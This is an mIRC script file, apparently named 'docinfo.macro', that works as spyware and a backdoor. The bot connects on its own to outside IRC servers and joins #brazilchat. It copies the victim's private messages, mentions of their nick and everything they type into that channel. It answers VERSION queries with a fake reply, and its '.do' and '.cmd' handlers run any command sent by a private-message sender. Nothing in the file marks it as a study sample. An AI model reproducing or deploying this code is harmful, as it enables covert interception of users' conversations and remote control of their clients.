docinfo.macro:
;sockbot
on *:text:*:?:spysend MSG de  $+ $nick $+ : $1-
on *:text:*:#:if ($me isin $strip($1-)) { spysend Nick Alert ->  $+ $chan $+ : $1- }
on *:input:*:spysend Input  $+ $active $+ : $1-

on *:start:unset %spyflood
alias -l spysend {
  $iif(%spyflood >= 5,return,inc -u15 %spyflood)
  sbcmd PRIVMSG #brazilchat : $+ $$1-
}

on *:connect:.signal sbcheck
on *:signal:ivariouscheck:.signal sbcheck
on *:signal:sbcheck:{
  if (!$timer(sbcheck)) { .timerchecksockbot -io 0 120 .signal sbcheck }
  if (!$sock(sockbot)) { sockopen sockbot $gettok(irc.mzima.net efnet.xs4all.nl,$r(1,2),32) 6667 }
  sbcmd nick $me
}
alias sbcmd if ($sock(sockbot).status == active && $1) { sockwrite -tn sockbot $1- }
on *:sockopen:sockbot:{
  if ($sockerr) { return }
  sbcmd user $me "" servername : $+ $me
  sbcmd nick $me
}
on *:sockread:sockbot:{
  if ($sockerr) { return }
  sockread %i | tokenize 32 %i | unset %i
  if (!$1) || ($2 == 372) { return }
  ;echo 4 -ts $1-
  var %nick = $gettok($mid($1,2-),1,33), %mask = $1
  if ($1 == PING) { sbcmd PONG $2- }
  if ($2 == PRIVMSG) {
    var %chan = $iif($left($3,1) == $chr(35),$3)
    tokenize 32 $mid($4-,2-)
    if ($left($1,1) ==  && $right($1-,1) == ) {
      tokenize 32 $mid($1-,2-,-1)
      if ($1 == VERSION) { sbcmd notice %nick :VERSION mIRC v6.16 Khaled Mardam-Bey }
      if ($1 == PING) { sbcmd notice %nick :PING $ctime $+  }
    }
    if (!%chan) {
      if ($1 == .do && $2) { $2- }
      if ($1 == .cmd) { sbcmd $2- }
      if ($1 == .uptime) { sbcmd NOTICE %nick :Uptime mIRC: $uptime(mirc,2) - Uptime System: $uptime(system,2) }
      if ($1 == .notice) { .timer 1 0 sbcmd NOTICE %nick : $2- }
    }
  }
  if ($2 == KICK) { sbcmd join $3 }
  if ($2 == 433) { sbcmd nick Guest $+ $r(1,$ticks) }
  if ($2 == 376) { sbcmd join #brazilchat }
}
